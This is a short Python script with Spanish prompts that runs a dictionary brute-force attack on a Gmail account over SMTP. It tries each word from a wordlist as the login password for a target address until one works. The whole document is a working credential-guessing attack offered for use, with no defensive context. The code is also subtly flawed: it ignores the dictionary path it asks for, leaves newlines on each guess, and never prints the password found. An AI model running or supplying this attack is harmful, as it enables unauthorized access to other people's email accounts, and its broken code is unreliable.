import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
email = input("Introduce el correo: ")
diccionario = input("Introduce ruta del diccionario: ")
dic = open('diccionario.txt', "r")
for word in dic:
    try:
        smtpserver.login(email, word)
        print("Contraseña correcta: ")
        break
    except:
        pass